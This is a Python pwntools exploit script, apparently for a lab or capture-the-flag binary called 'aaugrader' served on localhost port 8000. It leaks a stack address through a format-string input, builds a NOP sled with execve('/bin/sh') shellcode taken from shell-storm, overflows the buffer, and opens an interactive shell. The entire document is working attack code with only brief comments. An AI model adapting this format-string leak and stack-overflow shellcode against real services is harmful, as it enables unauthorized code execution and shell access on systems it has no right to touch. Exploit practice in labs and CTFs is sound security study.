#!/opt/pwntools/venv/bin/python3
import sys
from pwn import *

BINARY = './aaugrader'
exe = context.binary = ELF(BINARY)

p = connect("localhost", 8000)
#p = process(BINARY)


# https://shell-storm.org/shellcode/files/shellcode-846.html
# badchars: 0x0a,0x0b,0x0c,0x0d

# mov    esp, 0xffffd260    <-- MOVE stack pointer out of the way so we dont override our payload wtf
# xor    eax,eax
# push   eax
# push   0x68732f2f
# push   0x6e69622f
# mov    ebx,esp
# push   eax
# push   ebx
# mov    ecx,esp
# mov    al,0xa0 
# sub    al,0x95 // 0xa0 - 0x95 = 0x0b execve syscall
# int    0x80 

print(p.recvuntil(b"Semester: "))


p.sendline(b"_%6$p_")
leaked_data = str(p.recvuntil(b"Username: "))

straddr = leaked_data.split("_")[1].split("_")[0]
leaked_addr_offset = 80
nopsled_start = (int(straddr, 16) - leaked_addr_offset).to_bytes(4, byteorder='little') 

shellcode = b""
shellcode += b"\xbc" + nopsled_start #        mov    esp,<NOPSLED_START>
shellcode += b"\x31\xc0"             #        xor    eax,eax
shellcode += b"\x50"                 #        push   eax
shellcode += b"\x68\x2f\x2f\x73\x68" #        push   0x68732f2f
shellcode += b"\x68\x2f\x62\x69\x6e" #        push   0x6e69622f
shellcode += b"\x89\xe3"             #        mov    ebx,esp
shellcode += b"\x50"                 #        push   eax
shellcode += b"\x53"                 #        push   ebx
shellcode += b"\x89\xe1"             #        mov    ecx,esp
shellcode += b"\xb0\xa0"             #        mov    al,0xa0
shellcode += b"\x2c\x95"             #        sub    al,0x95
shellcode += b"\xcd\x80"             #        int    0x80 

padding = 106

payload = b"\x90" * (padding - len(shellcode))
payload += shellcode
payload += nopsled_start

p.send(payload)
p.interactive()
